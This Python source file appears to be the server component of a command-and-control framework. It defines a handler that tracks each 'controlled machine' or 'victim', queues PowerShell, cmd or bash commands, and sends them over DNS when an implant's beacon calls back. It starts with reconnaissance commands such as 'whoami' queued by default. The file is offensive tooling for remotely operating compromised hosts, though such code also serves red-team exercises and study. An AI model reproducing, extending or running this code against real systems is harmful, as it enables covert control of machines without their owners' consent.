from socketserver import BaseRequestHandler
import backend.handlers as handlers
from enum import Enum


class Commands(Enum):
    """ The types of commands that can be on the victim

    * NOP = Do nothing
    * POWERSHELL = Run something in powershell
    * CMD = Run Something in cmd

    """
    NOP = 0
    PS = 1
    CMD = 2
    BASH = 3


class ProvenanceClientHandler(BaseRequestHandler):

    client_count = 0

    """ Builtin Functions"""
    def __init__(self, request, client_address, server, hostname="", handler=None):
        # Superclass initialization
        self.request = request
        self.client_address = client_address
        self.server = server

        # Subclass Initialization
        self.hostname = hostname or f"Client_{self.client_count}"
        self.queued_commands = [(Commands.PS, "whoami"), (Commands.PS, "ls")]
        self.sent_commands = []
        self.commands_count = 0
        # The model that tracks each controlled machine
        # TODO: somehow dynamically assess the protocol (maybe set up multiple ports)
        self.protocol_handler = handler or handlers.dns.DNSHandler(
            ip=client_address[0], socket=request[1]
        )

        self.client_count += 1

    def __repr__(self):
        return f"ProvenanceClient{{{self.server[1]}, {self.hostname}}}"

    def update_handler(self, request,  client_address):
        """
        Update this instance to use the new request and socket
        parameters. Originally :module: socketserver.UDPServer
        would create a new instance for each request, this
        method must be called or the request will be sent
        to the previous temporary port used by the beacon
        to call back
        :param request: the request received by the server
        :param client_address: tuple of (IP, port)
        :return: None
        """
        self.client_address = client_address
        self.request = request

    def handle(self):
        """
        The method required by BaseRequestHandler that handles the
        incoming request. Will tell the underlying protocol
        handler (DNS, HTTP, ICMP, etc) to send the given command if there
        is one queued, else send NOP
        :return:  None
        """
        _, port = self.client_address
        if self.queued_commands:
            cmd_to_be_sent = self.queued_commands.pop()
        else:
            cmd_to_be_sent = (Commands.NOP, "NONE")
        self.protocol_handler.handle_request(self.request, port, cmd_to_be_sent)
        self.sent_commands.append((self.commands_count, cmd_to_be_sent))
        # self.sent_commands.append((request.header.id, cmd))

    def queue_command(self, ctype, cmd):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param ctype: type of command :module: protocolhandler.Commands
        :param cmd: the command to be sent
        :return: None
        """
        self.queued_commands.append((Commands[ctype], cmd))
        # self.protocol_handler.queue_cmd(ctype, cmd)

    def get_queued_commands(self):
        return self.queued_commands

    def get_sent_commands(self):
        return self.sent_commands

